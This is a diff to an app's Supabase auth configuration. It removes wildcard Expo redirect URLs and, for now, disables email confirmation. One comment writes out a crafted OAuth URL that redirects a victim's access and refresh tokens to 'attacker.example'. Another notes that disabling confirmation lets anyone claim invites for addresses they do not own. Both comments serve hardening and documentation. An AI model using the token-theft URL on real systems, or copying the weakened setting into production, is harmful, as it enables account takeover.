@@ -166,8 +166,15 @@ additional_redirect_urls = [
   # standalone build, and Supabase matches these exactly — so an extra slash would
   # silently break the Google OAuth return with no error the app could surface.
   "forge://**",
-  "exp://*",
-  "exp://**",
+  # No exp:// entries. GoTrue matches these with globs where `**` crosses `/`
+  # and `.`, so "exp://**" allowed ANY host: an attacker-built
+  # /auth/v1/authorize?provider=google&redirect_to=exp://attacker.example/--/cb
+  # (no code_challenge, so the implicit flow) would hand a victim with Expo Go
+  # installed a redirect carrying #access_token and #refresh_token straight into
+  # the attacker's bundle. Expo Go is the developer workflow, and developers hold
+  # the admin accounts. When Google sign-in has to be tested in Expo Go, add the
+  # exact LAN URL (exp://192.168.x.y:8081/--/auth/callback) in the dashboard for
+  # the session and remove it afterwards — never a wildcard here.
   "http://localhost:3000/**",
   # Covers the /auth/confirm and /auth/reset https bounce pages the email templates
   # now link to (apps/web/app/auth/[flow]/page.tsx).
@@ -241,7 +248,27 @@ enable_signup = true
 # addresses. If disabled, only the new email is required to confirm.
 double_confirm_changes = true
 # If enabled, users need to confirm their email address before signing in.
-enable_confirmations = true
+#
+# OFF, deliberately and temporarily. Outbound mail goes through Resend
+# ([auth.email.smtp] below) as noreply@forge.app, and forge.app is not a verified
+# sender domain in the Resend account — every send is rejected 403. With
+# confirmations ON, GoTrue treats that failure as fatal: POST /auth/v1/signup
+# returned 500 unexpected_failure / "Error sending confirmation email" and rolled
+# the whole signup back, so NO email/password account could be created at all.
+#
+# Two consequences of turning it off, both intentional for now:
+#   1. signUp() returns a session immediately, so (auth)/sign-up.tsx branches on
+#      `data.session` rather than always pushing to (auth)/verify-pending — that
+#      screen would otherwise be a dead end waiting for mail that never arrives.
+#   2. GoTrue stamps email_confirmed_at at signup without any proof of ownership,
+#      which weakens claim_client_invites() (0005): it gates on email_confirmed_at,
+#      so invite claiming degrades from "proven owner of the invited address" to
+#      "anyone who types it". Acceptable pre-launch; NOT acceptable with real
+#      clients on the platform.
+#
+# Turn back to true the moment a sender domain is verified in Resend. The sign-up
+# screen already handles both shapes, so that flip needs no code change.
+enable_confirmations = false
 # If enabled, users will need to reauthenticate or have logged in recently to change their password.
 secure_password_change = true
 # Controls the minimum amount of time that must pass before sending another signup confirmation or password reset email.
